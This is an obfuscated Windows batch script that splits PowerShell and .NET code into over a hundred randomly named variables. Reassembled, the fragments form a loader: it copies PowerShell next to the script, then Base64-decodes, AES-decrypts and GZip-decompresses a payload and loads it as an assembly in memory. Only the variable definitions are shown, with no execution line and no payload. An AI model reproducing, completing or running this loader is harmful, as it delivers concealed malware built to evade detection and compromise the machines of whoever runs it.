@echo off
set "NvMdTYbeAy=Sy"
set "SuFeyQMBtc=Po"
set "RMvanGmFOk=py"
set "WDrXYmRmaQ=\W"
set "pSlHpYIRvr=ow"
set "gpxVuvZMwP=Wi"
set "DRbAITgiNq=32"
set "QorIcByWug=\v"
set "xRlmdrCLWU=s\"
set "rvjOUBjAqs=do"
set "KpmYHvkIfc=0\"
set "UXrmtRhjYd=y "
set "PzwEZBtCcx=we"
set "zaRWxHcrUc=xe"
set "xTJiXThKZx=we"
set "LemyFQFdbO=ll"
set "gVcpzjQtff=ws"
set "rQRroUvyoN=he"
set "nzIHtkboOG=.e"
set "gVAwneXQnd=1."
set "RTeEEViuuB=:\"
set "JIkmnAbsbH=rs"
set "HaGqpMiiTv= C"
set "CSSZdgCXuv=nd"
set "SmAchAtSDP=po"
set "OKBGqWQepd=he"
set "NhrerKHFVM=em"
set "PIgnCHyypY=ll"
set "yJvmLFvMGx= /"
set "gjnKhxbedg=co"
set "drWIKrKQaX=rS"
set "tlaYmnePFw=st"
set "nMfAhFeHLj=in"
set "DZJfNqIORN= %~dp0"
set "VsPYEpwVwI=cd"
set "aaCmiGOgBg=Star"
set "mjLkSkQFLC=gth)"
set "RiKLUITMNM=Fina"
set "MXOelhkkes=cAIB"
set "TZkfZgxYPE=O.Me"
set "eFKcGpwirj=;$gV"
set "cSoJWwMVTc=$qzn"
set "VdMYDULWop=[Env"
set "hJUAJWmgUw=Invo"
set "wSsIlyAATg=Bx.I"
set "fSbYHHPedQ=, (,"
set "NhqvfkETfW=('da"
set "atisNwGbGN=BC;$"
set "kJlBqabIIO== [S"
set "awEyZbuYXH=oL'["
set "SvDHvgpXZy=tS46"
set "hlAhRgfPBn=ment"
set "AsKStehBjV=$huA"
set "CALNvohlBi=oArr"
set "PLpArwAgqJ=ress"
set "xOtBJBztdu=NJw "
set "tIsmCkiPQd=esMa"
set "GwbYLImRZC=yste"
set "ReuLSDBoyT=::('"
set "IcFOrfUNVH=bl.D"
set "YeSAmGqbCQ=6esa"
set "fRWtdrLKct=]::("
set "VJbzWZHVGn=y.Pa"
set "nveCrhBXQk=tem."
set "eTvAPWREED=tem."
set "HUVnFrJFJO=CZ.T"
set "ukCLnAOQCB=ionM"
set "hqvFqBOLgK= if "
set "ITTWSKoVik=  $t"
set "IqwRcEYaEt=.Mod"
set "FdzNagtdpl=r = "
set "gQlRZBJPHg=ion."
set "STjlRYnITW=;$qz"
set "MoCLmvbFit=stem"
set "ZUFbIysWDk==');"
set "bEiyGWtPNp=raph"
set "lRaTdhlhWr=$cAI"
set "cdyhJQmBtw===')"
set "NtSruqRrCR= [Sy"
set "nkgFEpsnkx= [st"
set "ZGEMPDhOZN=gMod"
set "obWuNLhmhJ=;$hu"
set "nDPlztqwmv=ew-O"
set "wLuLvqPaNX=m.IO"
set "SjqNpozgpC=.Cry"
set "hVeSLKnrEd=m.Re"
set "hAVBwbLGkF=mory"
set "sYnslFPveM=flec"
set "xltfTpEOoX=-joi"
set "aDQzMEBRcB=Comp"
set "jIyTZZPORP=AIBx"
set "EUArjVYDnp=rans"
set "LZKJaKkWAC=Nr ="
set "MkxinCrfoM=ewLi"
set "fiZSjpMkIj=Secu"
set "owceIWDoRo=Stre"
set "XRdnXKPdyE=106u"
set "nqGwOAevtB=3); "
set "mPrWtRvHJg=uAbl"
set "VmqLyuNtkJ=pk.T"
set "fNwXuBmwVz=1..-"
set "augnnhrzFK=L = "
set "qbfjMRCEUC=L4Yi"
set "LtoaHHeeZs=stem"
set "gdOZAzJJno=stem"
set "OCBOoTGwfh=[Sys"
set "VuuiHdvBhP=m.IO"
set "ioazPlyXib= [Sy"
set "RtrBYjDFbf=huAb"
set "YRcxkGakSy=Conv"
set "ahseDyaCTF=TllA"
set "dzUNHxhbnC=AIBx"
set "WARLcTytyx=ho ="
set "NTFTRPvAWt== $c"
set "dDTLjQeyCc=.-16"
set "xmtUFuaZql=ss -"
set "ILyLkOcXng=riNr"
set "issoLQafml=comp"
set "vjXzrpcuDR=rity"
set "oIhBtSELoD=ptog"
set "VKcNKuAPcC=o) {"
set "YYDaVXYaCP=criN"
set "DjgACwnjlT=New-"
set "JWJYOejqlT=zHhH"
set "LimnZIrLjG=y]::"
set "aDRgRzcpOm=w.En"
set "zjAXCgJEmh=6] -"
set "KvDXjypsOH=rofi"
set "jSLyFWXDeb=[Sys"
set "gLPSfUZkaz=.Sec"
set "ZotioduWEL=$HRP"
set "ipmGJuNdxm=.Cry"
set "KyDtJeWfbi=tion"
set "Bzqdybowpy=form"
set "iWhsnamHkg=pres"
set "NJcLkRPwXp=KLs "
set "jzTsKXrcSu=m(, "
